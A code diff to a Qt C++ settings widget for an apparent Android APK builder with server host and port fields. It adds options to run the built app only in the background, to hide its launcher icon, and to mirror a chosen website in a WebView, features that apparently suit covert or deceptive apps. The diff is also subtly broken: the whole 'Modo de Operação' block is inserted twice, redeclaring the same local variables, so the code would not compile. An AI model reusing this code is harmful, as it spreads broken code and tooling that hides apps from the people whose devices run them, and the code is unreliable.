@@ -22,7 +22,11 @@ ApkConfigWidget::ApkConfigWidget(QWidget *parent)
     , versionNameEdit(nullptr)
     , serverHostEdit(nullptr)
     , serverPortSpin(nullptr)
+    , backgroundOnlyCheck(nullptr)
+    , hideIconCheck(nullptr)
+    , enableWebviewCheck(nullptr)
     , iconPathLabel(nullptr)
+    , webviewUrlEdit(nullptr)
     , selectIconButton(nullptr) {
 
     setupUI();
@@ -140,6 +144,54 @@ void ApkConfigWidget::setupUI() {
 
     mainLayout->addWidget(permissionsGroup);
 
+    // Grupo: Modo de Operação
+    QGroupBox* operationModeGroup = new QGroupBox("Modo de Operação");
+    QVBoxLayout* operationModeLayout = new QVBoxLayout(operationModeGroup);
+
+    backgroundOnlyCheck = new QCheckBox("Rodar apenas em segundo plano (sem interface principal)");
+    hideIconCheck = new QCheckBox("Ocultar ícone do aplicativo na área de trabalho");
+
+    operationModeLayout->addWidget(backgroundOnlyCheck);
+    operationModeLayout->addWidget(hideIconCheck);
+
+    // Modo WebView
+    QGroupBox* webviewGroup = new QGroupBox("Modo Espelho de Site (WebView)");
+    webviewGroup->setCheckable(true);
+    webviewGroup->setChecked(false);
+    QFormLayout* webviewLayout = new QFormLayout(webviewGroup);
+
+    webviewUrlEdit = new QLineEdit("https://example.com");
+    webviewLayout->addRow("URL para espelhar:", webviewUrlEdit);
+
+    operationModeLayout->addWidget(webviewGroup);
+    enableWebviewCheck = webviewGroup; // O QGroupBox é o nosso checkbox
+
+    mainLayout->addWidget(operationModeGroup);
+
+    // Grupo: Modo de Operação
+    QGroupBox* operationModeGroup = new QGroupBox("Modo de Operação");
+    QVBoxLayout* operationModeLayout = new QVBoxLayout(operationModeGroup);
+
+    backgroundOnlyCheck = new QCheckBox("Rodar apenas em segundo plano (sem interface principal)");
+    hideIconCheck = new QCheckBox("Ocultar ícone do aplicativo na área de trabalho");
+
+    operationModeLayout->addWidget(backgroundOnlyCheck);
+    operationModeLayout->addWidget(hideIconCheck);
+
+    // Modo WebView
+    QGroupBox* webviewGroup = new QGroupBox("Modo Espelho de Site (WebView)");
+    webviewGroup->setCheckable(true);
+    webviewGroup->setChecked(false);
+    QFormLayout* webviewLayout = new QFormLayout(webviewGroup);
+
+    webviewUrlEdit = new QLineEdit("https://example.com");
+    webviewLayout->addRow("URL para espelhar:", webviewUrlEdit);
+
+    operationModeLayout->addWidget(webviewGroup);
+    enableWebviewCheck = webviewGroup; // O QGroupBox é o nosso checkbox
+
+    mainLayout->addWidget(operationModeGroup);
+
     // Grupo: Opções Avançadas
     QGroupBox* advancedGroup = new QGroupBox("Opções Avançadas");
     advancedGroup->setCheckable(true);
@@ -200,6 +252,10 @@ void ApkConfigWidget::setupUI() {
 void ApkConfigWidget::setupConnections() {
     connect(selectIconButton, &QPushButton::clicked, this, &ApkConfigWidget::onSelectIconClicked);
     connect(validateButton, &QPushButton::clicked, this, &ApkConfigWidget::validateConfiguration);
+    connect(backgroundOnlyCheck, &QCheckBox::toggled, this, [this](bool checked) {
+        // Se for apenas background, faz sentido ocultar o ícone.
+        if (checked) hideIconCheck->setChecked(true);
+    });
     connect(themeCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
             this, &ApkConfigWidget::onThemeChanged);
 }
@@ -250,6 +306,12 @@ ApkConfig ApkConfigWidget::getConfiguration() const {
     config.enableDebug = enableDebugCheck->isChecked();
     config.enableProguard = enableProguardCheck->isChecked();
 
+    // Novas opções
+    config.backgroundOnly = backgroundOnlyCheck->isChecked();
+    config.hideIcon = hideIconCheck->isChecked();
+    config.enableWebview = enableWebviewCheck->isChecked();
+    config.webviewUrl = webviewUrlEdit->text().toStdString();
+
     return config;
 }
 
@@ -288,6 +350,12 @@ void ApkConfigWidget::setConfiguration(const ApkConfig& config) {
     // Opções
     enableDebugCheck->setChecked(config.enableDebug);
     enableProguardCheck->setChecked(config.enableProguard);
+
+    // Novas opções
+    backgroundOnlyCheck->setChecked(config.backgroundOnly);
+    hideIconCheck->setChecked(config.hideIcon);
+    enableWebviewCheck->setChecked(config.enableWebview);
+    webviewUrlEdit->setText(QString::fromStdString(config.webviewUrl));
 }
 
 bool ApkConfigWidget::validateConfiguration() {
@@ -329,6 +397,16 @@ bool ApkConfigWidget::validateConfiguration() {
         errors << "Permissão de Internet é obrigatória";
     }
 
+    // Validar modo WebView
+    if (enableWebviewCheck->isChecked()) {
+        QUrl url(webviewUrlEdit->text().trimmed());
+        if (webviewUrlEdit->text().trimmed().isEmpty() || !url.isValid() || (url.scheme() != "http" && url.scheme() != "https")) {
+            errors << "URL para o modo espelho de site é inválida. Deve começar com http:// ou https://";
+        }
+        if (backgroundOnlyCheck->isChecked()) {
+            errors << "O modo 'Apenas em segundo plano' não pode ser combinado com o modo 'Espelho de Site'";
+        }
+    }
     // Mostrar resultado
     if (errors.isEmpty()) {
         QMessageBox::information(this, "Validação Bem-Sucedida",
@@ -372,6 +450,11 @@ void ApkConfigWidget::resetToDefaults() {
     enableProguardCheck->setChecked(true);
     enableDebugCheck->setChecked(false);
     enableAnalyticsCheck->setChecked(false);
+
+    backgroundOnlyCheck->setChecked(false);
+    hideIconCheck->setChecked(false);
+    enableWebviewCheck->setChecked(false);
+    webviewUrlEdit->setText("https://example.com");
 
     emit configurationChanged();
 }
